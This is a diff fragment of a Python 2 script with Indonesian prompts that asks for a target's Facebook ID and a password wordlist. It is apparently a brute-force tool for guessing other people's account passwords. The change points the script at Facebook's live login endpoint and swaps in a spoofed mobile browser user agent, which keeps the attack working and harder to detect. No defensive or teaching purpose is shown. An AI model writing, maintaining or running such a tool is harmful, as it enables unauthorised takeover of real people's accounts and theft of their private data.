@@ -49,9 +49,9 @@ def cover():
 cover()
 email = str(raw_input(GG + '[?]' + YY + ' Masukkan ID Target' + B + ' : '))
 passwordlist = str(raw_input(GG + '[?]' + YY + ' KETIK password.txt' + B + ' : '))
-login = 'https://free.facebook.com/login/?refsrc=https%3A%2F%2Ffree.facebook.com%2Flogin%2Fdevice-based%2Fedit-user%2F&_rdr'
+login = 'https://www.facebook.com/login.php?login_attempt=1'
 useragents = [
- ('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]
+ ('Mozilla/5.0 (Linux; Android 5.1.1; A33f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36) Geck')]
 
 def runntek(s):
     for c in s + '\n':
